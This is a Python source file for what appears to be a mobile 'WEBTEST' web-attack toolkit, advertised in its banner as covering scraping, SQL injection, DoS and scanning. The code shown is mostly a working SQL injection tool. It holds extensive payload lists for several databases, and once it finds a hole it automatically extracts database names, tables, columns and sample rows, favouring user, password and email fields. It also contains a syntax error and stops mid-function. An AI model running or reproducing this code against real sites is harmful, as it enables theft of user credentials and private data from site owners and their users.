import os
import re
import sys
import time
import json
import queue
import shutil
import signal
import random
import string
import threading
import subprocess
import socket
import dns.resolver
import ssl
from urllib.parse import urljoin, urlparse, urlunparse, parse_qs
import requests
from bs4 import BeautifulSoup
from tqdm import tqdm
from colorama import init as colorama_init, Fore, Back, Style

# Inisialisasi colorama dengan konversi ANSI untuk Windows
colorama_init(autoreset=True, convert=True, strip=True)

# Fungsi untuk membersihkan output dari kode ANSI
def clean_ansi(text):
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

# ====== Warna & Emoji ======
C = {
    "R": Fore.RED,
    "G": Fore.GREEN,
    "Y": Fore.YELLOW,
    "B": Fore.BLUE,
    "M": Fore.MAGENTA,
    "C": Fore.CYAN,
    "W": Fore.WHITE,
    "GR": Fore.BLACK,
    "RESET": Style.RESET_ALL,
    "BOLD": Style.BRIGHT,
}
EMO = {
    "spark": "✨",
    "boom": "💥",
    "rocket": "🚀",
    "ok": "✅",
    "warn": "⚠️",
    "info": "ℹ️",
    "disk": "💾",
    "down": "⬇️",
    "net": "🌐",
    "scan": "🧪",
    "shield": "🛡️",
    "search": "🔎",
    "gear": "⚙️",
    "folder": "📁",
    "exit": "🚪",
    "spider": "🕷️",
    "dos": "💣",
    "check": "✓",
    "cross": "✗",
    "warning": "⚠️".
}

UA = (
    "Mozilla/5.0 (Linux; Android 13; Termux) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Mobile Safari/537.36"
)
SESSION = requests.Session()
SESSION.headers.update({"User-Agent": UA})
REQUEST_TIMEOUT = 20
STOP_EVENT = threading.Event()
DOS_STOP_EVENT = threading.Event()

# ====== Util: Animasi ======
def type_print(text, delay=0.01):
    # Bersihkan kode ANSI sebelum mencetak
    clean_text = clean_ansi(text)
    for ch in clean_text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def spinner(text="Processing"):
    frames = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    i = 0
    while not STOP_EVENT.is_set():
        # Bersihkan kode ANSI sebelum mencetak
        clean_text = clean_ansi(f"{C['C']}{text} {frames[i%len(frames)]}{C['RESET']}")
        sys.stdout.write(f"\r{clean_text}")
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    sys.stdout.write("\r" + " " * (len(text) + 4) + "\r")

def banner():
    # Ganti 'clear' dengan 'cls' untuk Windows
    os.system("cls" if os.name == 'nt' else "clear")
    title = f"{C['BOLD']}{C['M']}WEBTEST{C['RESET']}"
    sub = f"{C['GR']}Termux Web Toolkit · Scraping + SQLi + DoS + Scanner · by ChatGPT{C['RESET']}"
    art = f"""
{C['Y']}{EMO['spark']} {title} {EMO['spark']}{C['RESET']}
{C['GR']}────────────────────────────────────────────────────────{C['RESET']}
{EMO['spider']}  Scraping: HTML · CSS · JS · Assets · Meta · Full
{EMO['shield']}  SQL Injection (sqlmap): Basic · Dump DBs · Crawl · Risk3 · Tor
{EMO['dos']}  DoS Attack: Customizable for testing your own website
{EMO['scan']}  Website Scanner: Security · Headers · Files · Vulnerabilities
{EMO['shield']} Coded by: Hamzah Wisnu Dzaky AKA HMZZZ233!
{EMO['warning]'} Don't attack random targets, just for security testing.
{EMO['info']}  After actions, shows your Public IP
{C['GR']}────────────────────────────────────────────────────────{C['RESET']}
"""
    # Bersihkan kode ANSI sebelum mencetak
    clean_art = clean_ansi(art)
    print(clean_art)

def input_colored(prompt):
    # Bersihkan kode ANSI sebelum mencetak
    clean_prompt = clean_ansi(f"{C['BOLD']}{C['G']}{prompt}{C['RESET']}")
    return input(clean_prompt)

def sanitize_folder(name: str):
    name = re.sub(r"[^a-zA-Z0-9._-]", "_", name)
    return name[:60]

def ensure_dir(path: str):
    os.makedirs(path, exist_ok=True)

def timestamp():
    return time.strftime("%Y%m%d-%H%M%S")

def get_public_ip():
    urls = [
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://ipinfo.io/ip",
    ]
    for u in urls:
        try:
            r = SESSION.get(u, timeout=10)
            if r.ok:
                ip = r.text.strip()
                if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip) or ":" in ip:
                    return ip
        except requests.RequestException:
            pass
    return "Unknown"

# ====== Scraping ======
def fetch_html(url: str):
    r = SESSION.get(url, timeout=REQUEST_TIMEOUT)
    r.raise_for_status()
    return r.text

def extract_assets(base_url: str, html: str):
    soup = BeautifulSoup(html, "html.parser")
    assets = {
        "css": set(),
        "js": set(),
        "img": set(),
        "icons": set(),
        "meta": [],
    }
    # CSS
    for link in soup.find_all("link", href=True):
        rel = " ".join(link.get("rel", [])).lower()
        href = urljoin(base_url, link["href"])
        if "stylesheet" in rel or href.lower().endswith(".css"):
            assets["css"].add(href)
        if "icon" in rel or any(href.lower().endswith(ext) for ext in [".ico", ".png", ".svg"]):
            assets["icons"].add(href)
    # JS
    for sc in soup.find_all("script", src=True):
        src = urljoin(base_url, sc["src"])
        assets["js"].add(src)
    # IMG
    for im in soup.find_all(["img","source"], src=True):
        src = urljoin(base_url, im["src"])
        assets["img"].add(src)
    for im in soup.find_all("img", srcset=True):
        # pick first candidate
        cand = im["srcset"].split(",")[0].strip().split(" ")[0]
        if cand:
            assets["img"].add(urljoin(base_url, cand))
    # META
    for m in soup.find_all("meta"):
        assets["meta"].append({k: m.get(k) for k in m.attrs})
    return assets

def write_text(path, content):
    with open(path, "w", encoding="utf-8", errors="ignore") as f:
        f.write(content)

def download_file(url, dest_path):
    try:
        with SESSION.get(url, stream=True, timeout=REQUEST_TIMEOUT) as r:
            r.raise_for_status()
            total = int(r.headers.get("Content-Length", 0))
            tmp = dest_path + ".part"
            with open(tmp, "wb") as f, tqdm(
                total=total if total > 0 else None,
                unit="B",
                unit_scale=True,
                dynamic_ncols=True,
                leave=False
            ) as pbar:
                for chunk in r.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
                        if total:
                            pbar.update(len(chunk))
            os.replace(tmp, dest_path)
        return True, ""
    except Exception as e:
        return False, str(e)

def choose_dir_for(url):
    netloc = urlparse(url).netloc or "site"
    base = sanitize_folder(f"{netloc}_{timestamp()}")
    outdir = os.path.join(os.getcwd(), "WEBTEST_RESULTS", base)
    ensure_dir(outdir)
    return outdir

# ====== Website Scanner ======
class WebsiteScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": UA})
        self.vulnerabilities = []
        self.sql_payloads = [
            "'", "''", "`", "``", ",", "\"", "\\", "\\'", "\\\"", ";", " OR '1'='1",
            " OR 1=1", " OR 1=1--", " OR 1=1#", " OR 1=1/*", ") OR '1'='1",
            ") OR ('1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
            "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*",
            "admin'--", "admin'#", "admin'/*", "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
            "' AND 1=2 UNION SELECT NULL,username,password FROM users--",
            "1' AND 1=2 UNION SELECT NULL,user,pass FROM admin--"
        ]
        
    def typewriter_effect(self, text, delay=0.01):
        # Bersihkan kode ANSI sebelum mencetak
        clean_text = clean_ansi(text)
        for ch in clean_text:
            sys.stdout.write(ch)
            sys.stdout.flush()
            time.sleep(delay)
        print()
        
    def loading_animation(self, text, delay=None):
        # Bersihkan kode ANSI sebelum mencetak
        clean_text = clean_ansi(f"\n{C['C']}⏳ {text}...{C['RESET']}")
        self.typewriter_effect(clean_text)
        
    def sql_injection_test(self, url):
        """Advanced SQL injection vulnerability testing with database extraction"""
        self.typewriter_effect(f"💉 Starting ADVANCED SQL injection test on: {url}")
        self.loading_animation("Analyzing URL parameters for SQLi vectors")
        
        try:
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            if not params:
                self.typewriter_effect("❌ No parameters found in URL for testing")
                return
            
            self.typewriter_effect(f"🎯 Testing {len(params)} parameter(s) with advanced techniques")
            
            # Enhanced SQL injection payloads
            advanced_payloads = [
                # Boolean-based blind payloads
                "' AND 1=1--", "' AND 1=2--", 
                "' OR 1=1--", "' OR 1=2--",
                "' AND SLEEP(5)--", "' AND BENCHMARK(10000000,MD5(1))--",
                
                # Time-based payloads
                "' OR IF(1=1,SLEEP(5),0)--",
                "' OR IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--",
                "' OR IF(ASCII(SUBSTRING((SELECT database()),1,1))>100,SLEEP(5),0)--",
                
                # Error-based payloads
                "' AND GTID_SUBSET(CONCAT(0x7178787171,(SELECT (ELT(1=1,1))),0x7178787171)--",
                "' AND EXTRACTVALUE(1,CONCAT(0x5c,0x7178787171,(SELECT MID((IFNULL(CAST(@@version AS CHAR),0x20)),1,50)),0x7178787171)--",
                
                # Union-based payloads
                "' UNION SELECT NULL,CONCAT(0x7178787171,0x4b5168596666534b5468,0x7178787171),NULL--",
                "' UNION SELECT NULL,@@version,NULL--",
                "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users--",
                
                # Database-specific payloads
                # MySQL
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7178787171,CAST(@@version AS CHAR),0x7178787171)) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                
                # PostgreSQL
                "' AND 1=CAST((SELECT version()) AS INT)--",
                "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
                
                # MSSQL
                "' AND 1=CONVERT(INT,(SELECT @@version))--",
                "'; WAITFOR DELAY '0:0:5'--",
                
                # Oracle
                "' AND 1=(SELECT 1 FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1)--",
                "' AND 1=(SELECT UTL_INADDR.get_host_address((SELECT password FROM users WHERE username='admin')))--",
                
                # SQLite
                "' AND 1=randomblob(1000000000)--",
                "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))--"
            ]
            
            # Combine basic and advanced payloads
            all_payloads = self.sql_payloads + advanced_payloads
            
            for param_name, param_values in params.items():
                self.typewriter_effect(f"\n🔍 Testing parameter: {param_name}")
                
                original_value = param_values[0] if param_values else '1'
                
                # Test each SQL payload
                for payload in all_payloads:
                    try:
                        # Create test URL with payload
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                        
                        start_time = time.time()
                        response = self.session.get(test_url, params=test_params, timeout=15)
                        response_time = time.time() - start_time
                        
                        # Enhanced error detection patterns
                        sql_errors = {
                            'MySQL': [
                                'SQL syntax.*MySQL', 'Warning.*mysql_.*',
                                'valid MySQL result', 'MySqlClient\.',
                                'com\.mysql\.jdbc\.exceptions'
                            ],
                            'PostgreSQL': [
                                'PostgreSQL.*ERROR', 'Warning.*pg_.*',
                                'valid PostgreSQL result', 'Npgsql\.',
                                'org\.postgresql\.util\.PSQLException'
                            ],
                            'Microsoft SQL Server': [
                                'Microsoft SQL Native Client.*[0-9]+',
                                'SQL Server.*[0-9]+', 'Warning.*mssql_.*',
                                'valid SQL Server result', 'System\.Data\.SqlClient\.SqlException',
                                'ODBC SQL Server Driver'
                            ],
                            'Oracle': [
                                'ORA-[0-9]+', 'Oracle error',
                                'Oracle.*Driver', 'Warning.*oci_.*',
                                'valid Oracle result'
                            ],
                            'SQLite': [
                                'SQLite/JDBCDriver', 'SQLite\.Exception',
                                'System\.Data\.SQLite\.SQLiteException',
                                'Warning.*sqlite_.*', 'valid SQLite result'
                            ],
                            'Generic': [
                                'SQL syntax.*', 'quoted string not properly terminated',
                                'unclosed quotation mark', 'syntax error',
                                'unterminated quoted string'
                            ]
                        }
                        
                        response_text = response.text.lower()
                        
                        # Detect database type and errors
                        detected_db = None
                        for db_type, patterns in sql_errors.items():
                            for pattern in patterns:
                                if re.search(pattern, response.text, re.IGNORECASE):
                                    detected_db = db_type
                                    self.typewriter_effect(f"\n🚨 {db_type} SQL INJECTION DETECTED!")
                                    self.typewriter_effect(f"   Parameter: {param_name}")
                                    self.typewriter_effect(f"   Payload: {payload}")
                                    self.typewriter_effect(f"   Error: {pattern}")
                                    
                                    self.vulnerabilities.append({
                                        'type': 'SQL Injection',
                                        'database': db_type,
                                        'description': f"{db_type} SQL injection in parameter '{param_name}'",
                                        'severity': 'Critical',
                                        'parameter': param_name,
                                        'payload': payload,
                                        'error_pattern': pattern,
                                        'url': url
                                    })
                                    break
                            if detected_db:
                                break
                        
                        # Time-based detection
                        if 'sleep(' in payload.lower() or 'waitfor' in payload.lower() or 'benchmark(' in payload.lower():
                            if response_time > 5:  # If response took more than 5 seconds
                                self.typewriter_effect(f"\n⏰ TIME-BASED SQL INJECTION DETECTED!")
                                self.typewriter_effect(f"   Parameter: {param_name}")
                                self.typewriter_effect(f"   Payload: {payload}")
                                self.typewriter_effect(f"   Response time: {response_time:.2f} seconds")
                                
                                self.vulnerabilities.append({
                                    'type': 'Time-based SQL Injection',
                                    'description': f"Time-based SQL injection in parameter '{param_name}'",
                                    'severity': 'Critical',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'response_time': response_time,
                                    'url': url
                                })
                        
                        # Boolean-based detection
                        if (' and 1=1' in payload.lower() or ' or 1=1' in payload.lower()) and not detected_db:
                            true_response = response.text
                            
                            # Test false condition
                            false_payload = payload.replace('1=1', '1=2')
                            test_params[param_name] = [false_payload]
                            false_response = self.session.get(test_url, params=test_params, timeout=10).text
                            
                            if true_response != false_response:
                                self.typewriter_effect(f"\n🔍 BOOLEAN-BASED SQL INJECTION DETECTED!")
                                self.typewriter_effect(f"   Parameter: {param_name}")
                                self.typewriter_effect(f"   Payload: {payload}")
                                
                                self.vulnerabilities.append({
                                    'type': 'Boolean-based SQL Injection',
                                    'description': f"Boolean-based SQL injection in parameter '{param_name}'",
                                    'severity': 'Critical',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'url': url
                                })
                        
                        time.sleep(0.3)  # Rate limiting
                        
                    except Exception as e:
                        continue
                
                # If vulnerabilities found, attempt database extraction
                if any(v['parameter'] == param_name for v in self.vulnerabilities):
                    self.extract_database_data(test_url, param_name, params)
            
            self.typewriter_effect("\n✅ Advanced SQL injection testing completed")
            
        except Exception as e:
            self.typewriter_effect(f"❌ SQL injection test failed: {str(e)}")
    
    def extract_database_data(self, base_url, param_name, original_params):
        """Extract database structure and content from vulnerable parameter"""
        self.typewriter_effect(f"\n🔍 Attempting to extract database information from parameter: {param_name}")
        
        # First determine database type
        db_type = None
        for vuln in self.vulnerabilities:
            if vuln['parameter'] == param_name and 'database' in vuln:
                db_type = vuln['database']
                break
        
        if not db_type:
            self.typewriter_effect("⚠️ Could not determine database type automatically")
            self.typewriter_effect("🔧 Trying to identify database type...")
            db_type = self.identify_database_type(base_url, param_name, original_params)
        
        if db_type:
            self.typewriter_effect(f"🛠️  Database identified as: {db_type}")
            
            # Extract database version
            self.extract_database_version(base_url, param_name, original_params, db_type)
            
            # Extract database name
            self.extract_database_name(base_url, param_name, original_params, db_type)
            
            # Extract table names
            tables = self.extract_database_tables(base_url, param_name, original_params, db_type)
            
            # Extract columns and data from each table
            if tables:
                for table in tables:
                    columns = self.extract_table_columns(base_url, param_name, original_params, db_type, table)
                    if columns:
                        self.extract_table_data(base_url, param_name, original_params, db_type, table, columns)
        else:
            self.typewriter_effect("❌ Failed to identify database type for extraction")
    
    def identify_database_type(self, base_url, param_name, original_params):
        """Identify the database type using version extraction techniques"""
        version_payloads = {
            'MySQL': "' UNION SELECT NULL,@@version,NULL--",
            'PostgreSQL': "' UNION SELECT NULL,version(),NULL--",
            'Microsoft SQL Server': "' UNION SELECT NULL,@@version,NULL--",
            'Oracle': "' UNION SELECT NULL,banner,NULL FROM v$version WHERE rownum=1--",
            'SQLite': "' UNION SELECT NULL,sqlite_version(),NULL--"
        }
        
        for db_type, payload in version_payloads.items():
            try:
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                
                response = self.session.get(base_url, params=test_params, timeout=10)
                
                if db_type == 'MySQL' and ('mysql' in response.text.lower() or 'mariadb' in response.text.lower()):
                    return 'MySQL'
                elif db_type == 'PostgreSQL' and 'postgresql' in response.text.lower():
                    return 'PostgreSQL'
                elif db_type == 'Microsoft SQL Server' and ('microsoft sql server' in response.text.lower() or 'sql server' in response.text.lower()):
                    return 'Microsoft SQL Server'
                elif db_type == 'Oracle' and ('oracle' in response.text.lower() or 'ora-' in response.text.lower()):
                    return 'Oracle'
                elif db_type == 'SQLite' and ('sqlite' in response.text.lower()):
                    return 'SQLite'
                
            except:
                continue
        
        return None
    
    def extract_database_version(self, base_url, param_name, original_params, db_type):
        """Extract database version information"""
        self.typewriter_effect("\n🔧 Extracting database version...")
        
        version_payloads = {
            'MySQL': "' UNION SELECT NULL,@@version,NULL--",
            'PostgreSQL': "' UNION SELECT NULL,version(),NULL--",
            'Microsoft SQL Server': "' UNION SELECT NULL,@@version,NULL--",
            'Oracle': "' UNION SELECT NULL,banner,NULL FROM v$version WHERE rownum=1--",
            'SQLite': "' UNION SELECT NULL,sqlite_version(),NULL--"
        }
        
        payload = version_payloads.get(db_type)
        if payload:
            try:
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                
                response = self.session.get(base_url, params=test_params, timeout=10)
                
                # Extract version from response
                version_pattern = r'([0-9]+\.[0-9]+\.[0-9]+)|(SQLite version [0-9.]+)|(Oracle Database [0-9a-zA-Z ]+)'
                match = re.search(version_pattern, response.text)
                
                if match:
                    version = match.group(0)
                    self.typewriter_effect(f"✅ Database version: {version}")
                    
                    self.vulnerabilities.append({
                        'type': 'Database Version',
                        'database': db_type,
                        'description': f"Extracted {db_type} version",
                        'severity': 'High',
                        'data': version,
                        'parameter': param_name
                    })
                    return version
                
            except Exception as e:
                self.typewriter_effect(f"❌ Failed to extract version: {str(e)}")
        
        self.typewriter_effect("⚠️ Could not extract database version")
        return None
    
    def extract_database_name(self, base_url, param_name, original_params, db_type):
        """Extract current database name"""
        self.typewriter_effect("\n🔧 Extracting database name...")
        
        name_payloads = {
            'MySQL': "' UNION SELECT NULL,database(),NULL--",
            'PostgreSQL': "' UNION SELECT NULL,current_database(),NULL--",
            'Microsoft SQL Server': "' UNION SELECT NULL,db_name(),NULL--",
            'Oracle': "' UNION SELECT NULL,global_name,NULL FROM global_name--",
            'SQLite': "' UNION SELECT NULL,file,NULL FROM sqlite_master--"
        }
        
        payload = name_payloads.get(db_type)
        if payload:
            try:
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                
                response = self.session.get(base_url, params=test_params, timeout=10)
                
                # Extract database name from response
                name_pattern = r'([a-zA-Z0-9_]+)'
                match = re.search(name_pattern, response.text)
                
                if match:
                    db_name = match.group(0)
                    self.typewriter_effect(f"✅ Database name: {db_name}")
                    
                    self.vulnerabilities.append({
                        'type': 'Database Name',
                        'database': db_type,
                        'description': f"Extracted {db_type} database name",
                        'severity': 'High',
                        'data': db_name,
                        'parameter': param_name
                    })
                    return db_name
                
            except Exception as e:
                self.typewriter_effect(f"❌ Failed to extract database name: {str(e)}")
        
        self.typewriter_effect("⚠️ Could not extract database name")
        return None
    
    def extract_database_tables(self, base_url, param_name, original_params, db_type):
        """Extract list of tables from database"""
        self.typewriter_effect("\n🔧 Extracting database tables...")
        
        table_payloads = {
            'MySQL': "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
            'PostgreSQL': "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_catalog=current_database()--",
            'Microsoft SQL Server': "' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--",
            'Oracle': "' UNION SELECT NULL,table_name,NULL FROM all_tables--",
            'SQLite': "' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'--"
        }
        
        payload = table_payloads.get(db_type)
        if payload:
            try:
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                
                response = self.session.get(base_url, params=test_params, timeout=10)
                
                # Extract table names from response
                table_pattern = r'([a-zA-Z0-9_]+)'
                tables = re.findall(table_pattern, response.text)
                
                # Filter out common false positives
                common_terms = ['html', 'body', 'div', 'table', 'span', 'style', 'script']
                tables = [t for t in tables if t.lower() not in common_terms and len(t) > 3]
                
                if tables:
                    tables = list(set(tables))  # Remove duplicates
                    self.typewriter_effect(f"✅ Found {len(tables)} tables:")
                    for i, table in enumerate(tables[:10]):  # Show first 10 tables
                        self.typewriter_effect(f"   {i+1}. {table}")
                    
                    if len(tables) > 10:
                        self.typewriter_effect(f"   ... and {len(tables)-10} more tables")
                    
                    self.vulnerabilities.append({
                        'type': 'Database Tables',
                        'database': db_type,
                        'description': f"Extracted {len(tables)} tables from database",
                        'severity': 'High',
                        'data': ', '.join(tables[:10]),
                        'parameter': param_name
                    })
                    return tables
                
            except Exception as e:
                self.typewriter_effect(f"❌ Failed to extract tables: {str(e)}")
        
        self.typewriter_effect("⚠️ Could not extract database tables")
        return None
    
    def extract_table_columns(self, base_url, param_name, original_params, db_type, table):
        """Extract columns from a specific table"""
        self.typewriter_effect(f"\n🔧 Extracting columns from table: {table}")
        
        column_payloads = {
            'MySQL': f"' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='{table}'--",
            'PostgreSQL': f"' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='{table}'--",
            'Microsoft SQL Server': f"' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='{table}'--",
            'Oracle': f"' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='{table.upper()}'--",
            'SQLite': f"' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table' AND name='{table}'--"
        }
        
        payload = column_payloads.get(db_type)
        if payload:
            try:
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                
                response = self.session.get(base_url, params=test_params, timeout=10)
                
                # Extract column names from response
                if db_type == 'SQLite':
                    # SQLite returns the CREATE TABLE statement
                    create_table = response.text
                    column_pattern = r'(\w+)\s+[a-zA-Z]+\s*(?:\([^)]*\))?(?:\s+\w+)*'
                    columns = re.findall(column_pattern, create_table)
                else:
                    column_pattern = r'([a-zA-Z0-9_]+)'
                    columns = re.findall(column_pattern, response.text)
                
                # Filter out common false positives
                common_terms = ['html', 'body', 'div', 'table', 'span', 'style', 'script']
                columns = [c for c in columns if c.lower() not in common_terms and len(c) > 2]
                
                if columns:
                    columns = list(set(columns))  # Remove duplicates
                    self.typewriter_effect(f"✅ Found {len(columns)} columns in {table}:")
                    for i, column in enumerate(columns[:10]):  # Show first 10 columns
                        self.typewriter_effect(f"   {i+1}. {column}")
                    
                    if len(columns) > 10:
                        self.typewriter_effect(f"   ... and {len(columns)-10} more columns")
                    
                    self.vulnerabilities.append({
                        'type': 'Table Columns',
                        'database': db_type,
                        'description': f"Extracted {len(columns)} columns from table '{table}'",
                        'severity': 'High',
                        'table': table,
                        'data': ', '.join(columns[:10]),
                        'parameter': param_name
                    })
                    return columns
                
            except Exception as e:
                self.typewriter_effect(f"❌ Failed to extract columns: {str(e)}")
        
        self.typewriter_effect(f"⚠️ Could not extract columns from table {table}")
        return None
    
    def extract_table_data(self, base_url, param_name, original_params, db_type, table, columns):
        """Extract sample data from a table"""
        self.typewriter_effect(f"\n🔧 Extracting sample data from table: {table}")
        
        # Look for interesting columns (users, passwords, etc.)
        interesting_columns = []
        for col in columns:
            if 'user' in col.lower() or 'name' in col.lower() or 'pass' in col.lower() or 'email' in col.lower():
                interesting_columns.append(col)
        
        if not interesting_columns:
            interesting_columns = columns[:3]  # Just get first few columns if no obvious interesting ones
        
        # Build SELECT query
        if db_type == 'SQLite':
            # SQLite has different syntax for concatenation
            select_expr = "','||" + "||','||".join(interesting_columns) + "||'"
        else:
            select_expr = "CONCAT('|'," + ",'|',".join(interesting_columns) + ",'|')"
        
        limit = 5  # Only get 5 rows to avoid huge responses
        data_payload = f"' UNION SELECT NULL,{select_expr},NULL FROM {table} LIMIT {limit}--"
        
        try:
            test_params = original_params.copy()
            test_params[param_name] = [data_payload]
            
            response = self.session.get(base_url, params=test_params, timeout=10)
            
            # Extract data from response
            data_pattern = r'\|(.+?)\|'
            matches = re.findall(data_pattern, response.text)
            
            if matches:
                self.typewriter_effect(f"✅ Sample data from {table}:")
                for i, match in enumerate(matches[:5]):  # Show first 5 rows
                    self.typewriter_effect(f"   Row {i+1}: {match}")
                
                self.vulnerabilities.append({
                    'type': 'Table Data',
                    'database': db_type,
                    'description': f"Extracted sample data from table '{table}'",
                    'severity': 'Critical',
                    'table': table,
                    'columns': ', '.join(interesting_columns),
                    'sample_data': matches[:5],
                    'parameter': param_name
                })
                return matches
            else:
                self.typewriter_effect(f"⚠️ No data extracted from table {table}")
                return None
                
        except Exception as e:
            self.typewriter_effect(f"❌ Failed to extract data: {str(e)}")
            return None
    
    def get_web_info(self, url):
        """Get comprehensive information about a website"""
        self.typewriter_effect(f"🌐 Gathering website information for: {url}")
        
        try:
            # Parse URL and validate
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
                
            parsed_url = urlparse(url)
            domain = parsed_url.netloc
            
            # Create result dictionary
            info = {
                'url': url,
                'domain': domain,
                'is_secure': parsed_url.scheme == 'https',
                'ip_address': '',
                'server_info': {},
                'technologies': [],
                'status': 'Unknown',
                'dns_records': {},
                'headers': {},
                'security_headers': {}
            }
            
            # Get IP address
            self.loading_animation("Resolving IP address")
            try:
                ip = socket.gethostbyname(domain)
                info['ip_address'] = ip
            except:
                info['ip_address'] = "Could not resolve"
            
            # Check if site is online
            self.loading_animation("Checking site availability")
            try:
                response = self.session.head(url, timeout=10)
                info['status'] = f"Online (HTTP {response.status_code})"
            except:
                info['status'] = "Offline or unreachable"
                self.typewriter_effect("\n❌ Website appears to be offline")
                return info
            
            # Get server headers
            self.loading_animation("Analyzing server headers")
            response = self.session.get(url, timeout=10)
            info['headers'] = dict(response.headers)
            
            # Extract server info from headers
            server_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version']
            for header in server_headers:
                if header in response.headers:
                    info['server_info'][header] = response.headers[header]
            
            # Check common security headers
            security_headers = [
                'Strict-Transport-Security',
                'Content-Security-Policy',
                'X-Content-Type-Options',
                'X-Frame-Options',
                'X-XSS-Protection',
                'Referrer-Policy',
                'Feature-Policy',
                'Permissions-Policy'
            ]
            
            for header in security_headers:
                if header in response.headers:
                    info['security_headers'][header] = response.headers[header]
            
            # Get DNS records
            self.loading_animation("Checking DNS records")
            try:
                dns_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
                resolver = dns.resolver.Resolver()
                
                for record_type in dns_types:
                    try:
                        answers = resolver.resolve(domain, record_type)
                        info['dns_records'][record_type] = [str(r) for r in answers]
                    except:
                        continue
            except:
                info['dns_records'] = "DNS lookup failed"
            
            # Detect technologies (basic detection)
            self.loading_animation("Detecting technologies")
            tech_detected = set()
            
            # From headers
            if 'Server' in response.headers:
                server = response.headers['Server']
                tech_detected.add(server.split('/')[0])  # e.g. "nginx/1.2" -> "nginx"
            
            if 'X-Powered-By' in response.headers:
                powered_by = response.headers['X-Powered-By']
                tech_detected.update(x.strip() for x in powered_by.split(','))
            
            # From HTML content
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Detect WordPress
            if 'wp-content' in response.text or 'wp-includes' in response.text:
                tech_detected.add('WordPress')
            
            # Detect jQuery
            scripts = soup.find_all('script', src=True)
            for script in scripts:
                src = script['src'].lower()
                if 'jquery' in src:
                    tech_detected.add('jQuery')
                if 'bootstrap' in src:
                    tech_detected.add('Bootstrap')
                if 'react' in src:
                    tech_detected.add('React')
                if 'vue' in src:
                    tech_detected.add('Vue.js')
            
            # Detect PHP
            if '.php' in response.text or 'PHPSESSID' in response.text:
                tech_detected.add('PHP')
            
            info['technologies'] = sorted(tech_detected)
            
            return info
            
        except Exception as e:
            self.typewriter_effect(f"❌ Website info gathering failed: {str(e)}")
            return None
    
    def display_web_info(self, info):
        """Display the website information in a formatted way"""
        if not info:
            self.typewriter_effect("❌ No website information to display")
            return
        
        self.typewriter_effect("\n🌐 WEBSITE INFORMATION REPORT:")
        self.typewriter_effect("══════════════════════════════════════════════")
        
        # Basic Info
        self.typewriter_effect(f"\n🔍 Basic Information:")
        self.typewriter_effect(f"   URL: {info['url']}")
        self.typewriter_effect(f"   Domain: {info['domain']}")
        self.typewriter_effect(f"   IP Address: {info['ip_address']}")
        self.typewriter_effect(f"   Secure (HTTPS): {'✅ Yes' if info['is_secure'] else '❌ No'}")
        self.typewriter_effect(f"   Status: {info['status']}")
        
        # Server Info
        if info['server_info']:
            self.typewriter_effect("\n🖥️ Server Information:")
            for key, value in info['server_info'].items():
                self.typewriter_effect(f"   {key}: {value}")
        else:
            self.typewriter_effect("\n⚠️ No server information found in headers")
        
        # Technologies
        if info['technologies']:
            self.typewriter_effect("\n⚙️ Detected Technologies:")
            for tech in info['technologies']:
                self.typewriter_effect(f"   - {tech}")
        else:
            self.typewriter_effect("\n⚠️ No technologies detected")
        
        # DNS Records
        if info['dns_records'] and isinstance(info['dns_records'], dict):
            self.typewriter_effect("\n📡 DNS Records:")
            for record_type, values in info['dns_records'].items():
                self.typewriter_effect(f"   {record_type}:")
                for value in values:
                    self.typewriter_effect(f"      {value}")
        else:
            self.typewriter_effect("\n⚠️ No DNS records retrieved")
        
        # Security Headers
        if info['security_headers']:
